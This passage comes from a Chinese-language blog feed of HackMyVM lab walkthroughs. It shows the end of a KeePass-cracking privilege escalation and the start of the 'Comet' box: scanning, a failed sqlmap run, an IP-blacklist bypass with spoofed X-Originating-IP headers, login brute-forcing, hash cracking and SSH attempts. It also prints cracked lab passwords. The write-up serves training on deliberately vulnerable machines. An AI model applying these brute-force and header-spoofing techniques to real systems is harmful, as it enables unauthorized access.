-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">161</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> MANIFEST.in
drwxrwxr-x <span class="token number">9</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> mining
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">3501</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> README.rst
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp   <span class="token number">34</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> requirements_dev.txt
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">261</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> requirements.txt
drwxrwxr-x <span class="token number">2</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> scripts
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">230</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> setup.cfg
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">2366</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> setup.py
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">312</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .travis.yml</code></pre>
<p>不过Document下面有个东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~/Documents$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">2</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-x--- <span class="token number">19</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> earlyp earlyp <span class="token number">1918</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Passwords.kdbx</code></pre>
<p>根据搜索引擎知道kdbx是密码管理工具，里面有可能放了root的密码</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>wget到kali上然后用john爆破<br>爆破花了好长时间最好爆出来kdbx管理密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># john passw.txt --wordlist=/usr/share/wordlists/rockyou.txt </span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>KeePass <span class="token punctuation">[</span>SHA256 AES <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">3225806</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">2</span> <span class="token punctuation">(</span>version<span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">3</span> <span class="token punctuation">(</span>algorithm <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>AES <span class="token assign-left variable">1</span><span class="token operator">=</span>TwoFish <span class="token assign-left variable">2</span><span class="token operator">=</span>ChaCha<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">0</span> <span class="token keyword">for</span> all loaded hashes
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
mandalorian      <span class="token punctuation">(</span>Passwords<span class="token punctuation">)</span>  </code></pre>
<p>用keepassxc进去这个密码管理文件，果然有root的密码<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXf3S.png" alt="OmXf3S.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/04/17/OmXjtC.png" alt="OmXjtC.png" loading="lazy"><br><code>root:7%z5,c9=w6[x8=</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~/Documents$ <span class="token function">su</span> root
Password: 
root@codeshield:/home/earlyp/Documents<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>成功拿到root权限</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>pdf</tag>
        <tag>kdbx</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Comet</title>
    <url>/posts/151f8aa9/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.182</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop                                                                                                                                                                                                               root@kali2  <span class="token number">16</span>:37:45 
<span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:44:da:d5       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.182  08:00:27:56:cd:cd       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.924</span> seconds <span class="token punctuation">(</span><span class="token number">133.06</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.182 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> 
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-11 <span class="token number">16</span>:38 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.182
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00029s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span>+deb11u1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">33</span>:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.54 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.54 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: CyberArray
MAC Address: 08:00:27:56:CD:CD <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.29</span> ms <span class="token number">192.168</span>.56.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">7.94</span> seconds</code></pre>
<p>开放了22 80两个端口<br>去web看看<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXFWb.png" alt="OJXFWb.png" loading="lazy"><br>在博客界面下面找到两个用户名 <code>admin</code> <code>Owner</code>,先记着<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXhyl.png" alt="OJXhyl.png" loading="lazy"><br>剩下没找到什么利用的地方，扫一下目录</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; gobuster dir -u http:&#x2F;&#x2F;192.168.56.182 -x html,txt,php,bak,zip --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
[+] Url:                     http:&#x2F;&#x2F;192.168.56.182
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster&#x2F;3.6
[+] Extensions:              bak,zip,html,txt,php
[+] Timeout:                 10s
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Starting gobuster in directory enumeration mode
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
&#x2F;.html                (Status: 403) [Size: 279]
&#x2F;.php                 (Status: 403) [Size: 279]
&#x2F;images               (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;192.168.56.182&#x2F;images&#x2F;]
&#x2F;index.html           (Status: 200) [Size: 7097]
&#x2F;contact.html         (Status: 200) [Size: 5886]
&#x2F;about.html           (Status: 200) [Size: 7024]
&#x2F;blog.html            (Status: 200) [Size: 8242]
&#x2F;support.html         (Status: 200) [Size: 6329]
&#x2F;login.php            (Status: 200) [Size: 1443]
&#x2F;ip.txt               (Status: 200) [Size: 0]
&#x2F;js                   (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.56.182&#x2F;js&#x2F;]
&#x2F;.php                 (Status: 403) [Size: 279]
&#x2F;.html                (Status: 403) [Size: 279]
&#x2F;server-status        (Status: 403) [Size: 279]
Progress: 1011290 &#x2F; 1323366 (76.42%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1011290 &#x2F; 1323366 (76.42%)
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Finished
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</code></pre>
<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>有个ip.txt但是大小为0，剩下就是login.php了，只能从这里入手了<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXisg.png" alt="OJXisg.png" loading="lazy"><br>第一手肯定是想sql注入，抓包跑了一下，并没有跑出东西……</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; sqlmap -l sql.txt --batch  
        ___
       __H__
 ___ ___[)]_____ ___ ___  &#123;1.8.2#stable&#125;
|_ -| . [(]     | .&#39;| . |
|___|_  [&quot;]_|_|_|__,|  _|
      |_|V...       |_|   https:&#x2F;&#x2F;sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:43:39 &#x2F;2024-06-11&#x2F;

[16:43:39] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
[1&#x2F;1] URL:
GET http:&#x2F;&#x2F;192.168.56.182:80&#x2F;login.php
POST data: username&#x3D;admin&amp;password&#x3D;admin
do you want to test this URL? [Y&#x2F;n&#x2F;q]
&gt; Y
[16:43:39] [INFO] testing URL &#39;http:&#x2F;&#x2F;192.168.56.182:80&#x2F;login.php&#39;
[16:43:39] [INFO] using &#39;&#x2F;root&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;results-06112024_0443pm.csv&#39; as the CSV results file in multiple targets mode
[16:43:39] [INFO] testing connection to the target URL
[16:43:39] [INFO] checking if the target is protected by some kind of WAF&#x2F;IPS
[16:43:39] [INFO] testing if the target URL content is stable
[16:43:40] [INFO] target URL content is stable
[16:43:40] [INFO] testing if POST parameter &#39;username&#39; is dynamic
[16:43:40] [WARNING] POST parameter &#39;username&#39; does not appear to be dynamic
[16:43:40] [WARNING] heuristic (basic) test shows that POST parameter &#39;username&#39; might not be injectable
[16:43:40] [INFO] testing for SQL injection on POST parameter &#39;username&#39;
[16:43:40] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
[16:43:40] [INFO] testing &#39;Boolean-based blind - Parameter replace (original value)&#39;
[16:43:40] [INFO] testing &#39;MySQL &gt;&#x3D; 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;
[16:43:40] [INFO] testing &#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;
[16:43:40] [INFO] testing &#39;Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause (IN)&#39;
[16:43:40] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;
[16:43:40] [INFO] testing &#39;Generic inline queries&#39;
[16:43:40] [INFO] testing &#39;PostgreSQL &gt; 8.1 stacked queries (comment)&#39;
[16:43:40] [INFO] testing &#39;Microsoft SQL Server&#x2F;Sybase stacked queries (comment)&#39;
[16:43:40] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;
[16:43:40] [INFO] testing &#39;MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)&#39;
[16:43:40] [INFO] testing &#39;PostgreSQL &gt; 8.1 AND time-based blind&#39;
[16:43:40] [INFO] testing &#39;Microsoft SQL Server&#x2F;Sybase time-based blind (IF)&#39;
[16:43:40] [INFO] testing &#39;Oracle AND time-based blind&#39;
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y&#x2F;n] Y
[16:43:40] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
[16:43:40] [WARNING] POST parameter &#39;username&#39; does not seem to be injectable
[16:43:40] [INFO] testing if POST parameter &#39;password&#39; is dynamic
[16:43:40] [WARNING] POST parameter &#39;password&#39; does not appear to be dynamic
[16:43:40] [WARNING] heuristic (basic) test shows that POST parameter &#39;password&#39; might not be injectable
[16:43:40] [INFO] testing for SQL injection on POST parameter &#39;password&#39;
[16:43:40] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
[16:43:40] [INFO] testing &#39;Boolean-based blind - Parameter replace (original value)&#39;
[16:43:40] [INFO] testing &#39;MySQL &gt;&#x3D; 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;
[16:43:40] [INFO] testing &#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;
[16:43:40] [INFO] testing &#39;Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause (IN)&#39;
[16:43:40] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;
[16:43:40] [INFO] testing &#39;Generic inline queries&#39;
[16:43:40] [INFO] testing &#39;PostgreSQL &gt; 8.1 stacked queries (comment)&#39;
[16:43:40] [INFO] testing &#39;Microsoft SQL Server&#x2F;Sybase stacked queries (comment)&#39;
[16:43:41] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;
[16:45:43] [WARNING] user aborted during detection phase^[[A^[[A^[[A^[[A^C
how do you want to proceed? [ne(X)t target&#x2F;(s)kip current test&#x2F;(e)nd detection phase&#x2F;(n)ext parameter&#x2F;(c)hange verbosity&#x2F;(q)uit] s
[16:45:58] [INFO] testing &#39;MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)&#39;
[16:45:58] [INFO] testing &#39;PostgreSQL &gt; 8.1 AND time-based blind&#39;
[16:45:58] [INFO] testing &#39;Microsoft SQL Server&#x2F;Sybase time-based blind (IF)&#39;
[16:45:58] [INFO] testing &#39;Oracle AND time-based blind&#39;
[16:45:58] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
[16:45:58] [WARNING] POST parameter &#39;password&#39; does not seem to be injectable
[16:45:58] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for &#39;--level&#39;&#x2F;&#39;--risk&#39; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#39;--tamper&#39; (e.g. &#39;--tamper&#x3D;space2comment&#39;) and&#x2F;or switch &#39;--random-agent&#39;, skipping to the next target
[16:45:58] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#39;&#x2F;root&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;results-06112024_0443pm.csv&#39;

[*] ending @ 16:45:58 &#x2F;2024-06-11&#x2F;
</code></pre>
<p>额，sql注入不行，试试爆破，直接拿到，试试admin的弱口令<br>不过我用burpsuite爆破失败了，而且login.php界面卡住进不去<br><img src="https://ooo.0x0.ooo/2024/06/11/OJX7es.png" alt="OJX7es.png" loading="lazy"><br>我在windows进不去，但是kali能进去<br>不过输错了一次密码之后也进不去了，好像后天设了限制，输出一次ip进去黑名单，我于是想到了ip.txt，curl一下果然发现了我的ip在里面</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; curl http:&#x2F;&#x2F;192.168.56.182&#x2F;ip.txt   
192.168.56.1</code></pre>
<p>我用windows输错密码，结果就在ip.txt里面了<br>想着在请求头加个XFF伪造一下ip结果成功了<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXNGK.png" alt="OJXNGK.png" loading="lazy"><br>既然如此，那用burpsuite爆破了<br>我擦，试了一下，发现又被ban了，奇了怪了，恶心的难受看了一眼wp<br>加个<code>X-Originating-IP: 0.0.0.0</code>头就可以了<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXe3a.png" alt="OJXe3a.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/11/OJXAhS.png" alt="OJXAhS.png" loading="lazy"><br>爆破出来一个密码<code>solitario</code>，后来又测试了一下用X-Forwarded-For头也可以，但是爆破一会就会寄，不懂，不过头一回见到<code>X-Originating-IP</code>这个伪造ip的，记下来<br>拿到密码登录之后发现一堆日志文件<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXKtN.png" alt="OJXKtN.png" loading="lazy"><br>看了几个没什么发现，发现最下面有个可执行文件</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; file firewall_update 
firewall_update: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;c8b4cde0414ff49d15473b0d47cde256c7931587, for GNU&#x2F;Linux 3.2.0, not stripped</code></pre>
<p>64位可执行文件，反编译一下<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXZjC.png" alt="OJXZjC.png" loading="lazy"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-F0h] BYREF</span>
  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-A0h] BYREF</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A0h] [rbp-50h] BYREF</span>
  <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+C0h] [rbp-30h] BYREF</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+ECh] [rbp-4h]</span>

  <span class="token function">strcpy</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">SHA256</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"%02x"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Firewall successfully updated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Incorrect password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>验证密码，用了sha256加密，解密一下看看<br><img src="https://ooo.0x0.ooo/2024/06/11/OJXyWL.png" alt="OJXyWL.png" loading="lazy"><br>这个哈希对应密码<code>prettywoman</code>，以为是owner用户的密码，登录发现失败，ssh也登录不上</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> owner@192.168.56.182   
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.182 (192.168.56.182)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:s1UJuaVeu8UNzbo7FaamRo2EWZrzFXveeiWZyCxeJE0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:72: [hashed name]
    ~/.ssh/known_hosts:74: [hashed name]
    ~/.ssh/known_hosts:110: [hashed name]
    ~/.ssh/known_hosts:114: [hashed name]
    ~/.ssh/known_hosts:116: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.56.182<span class="token string">' (ED25519) to the list of known hosts.
owner@192.168.56.182'</span>s password: 
Permission denied, please try again.</code></pre>
<h2 id="用户名爆破getshell"><a href="#用户名爆破getshell" class="headerlink" title="用户名爆破getshell"></a>用户名爆破getshell</h2><p>既然owner不对，用hydra爆破一下用户名</p>
